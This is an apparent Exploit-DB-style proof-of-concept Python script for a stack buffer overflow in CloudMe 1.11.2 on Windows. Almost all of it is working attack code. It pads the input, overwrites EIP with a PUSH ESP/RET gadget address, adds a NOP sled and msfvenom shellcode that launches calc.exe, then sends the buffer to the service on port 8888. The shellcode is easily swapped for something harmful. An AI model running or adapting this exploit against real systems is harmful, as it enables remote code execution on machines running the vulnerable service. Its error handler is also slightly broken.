# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket
target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python

payload =  b""
payload += b"\xdd\xc2\xb8\xa3\x59\x6e\xa2\xd9\x74\x24\xf4\x5a"
payload += b"\x29\xc9\xb1\x3e\x31\x42\x19\x83\xc2\x04\x03\x42"
payload += b"\x15\x41\xac\x92\x4a\x07\x4f\x6b\x8b\x67\xd9\x8e"
payload += b"\xba\xa7\xbd\xdb\xed\x17\xb5\x8e\x01\xdc\x9b\x3a"
payload += b"\x91\x90\x33\x4c\x12\x1e\x62\x63\xa3\x32\x56\xe2"
payload += b"\x27\x48\x8b\xc4\x16\x83\xde\x05\x5e\xf9\x13\x57"
payload += b"\x37\x76\x81\x48\x3c\xc2\x1a\xe2\x0e\xc3\x1a\x17"
payload += b"\xc6\xe2\x0b\x86\x5c\xbd\x8b\x28\xb0\xb6\x85\x32"
payload += b"\xd5\xf2\x5c\xc8\x2d\x89\x5e\x18\x7c\x72\xcc\x65"
payload += b"\xb0\x81\x0c\xa1\x77\x79\x7b\xdb\x8b\x04\x7c\x18"
payload += b"\xf1\xd2\x09\xbb\x51\x91\xaa\x67\x63\x76\x2c\xe3"
payload += b"\x6f\x33\x3a\xab\x73\xc2\xef\xc7\x88\x4f\x0e\x08"
payload += b"\x19\x0b\x35\x8c\x41\xc8\x54\x95\x2f\xbf\x69\xc5"
payload += b"\x8f\x60\xcc\x8d\x22\x75\x7d\xcc\x28\x88\xf3\x6a"
payload += b"\x1e\x8a\x0b\x75\x0f\xe2\x3a\xfe\xc0\x75\xc3\xd5"
payload += b"\xa4\x89\x89\x74\x8c\x01\x54\xed\x8c\x4c\x67\xdb"
payload += b"\xd3\x68\xe4\xee\xab\x8f\xf4\x9a\xae\xd4\xb2\x77"
payload += b"\xc3\x45\x57\x78\x70\x66\x72\x3b\x4c\xc4\x05\xdd"
payload += b"\xdd\x84\x85\x41\x76\x10\x02\x15\xe5\xab\x96\x8e"
payload += b"\x90\x26\x7b\x24\x13\xd4\xec\xa7\xb7\x78\x9d\x44"
payload += b"\x16\xe5\x19\xee\x46\xc8\xbc\xd0\xe5\x7f\x5b\x3f"
payload += b"\x8f\x07\xc6\x1f\x7e\xc7\x26\x51\xb0\x09\x06\xa5"
payload += b"\x9e\x62\x5d\xe5\xea\xb8\xa9\xd0\x12"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
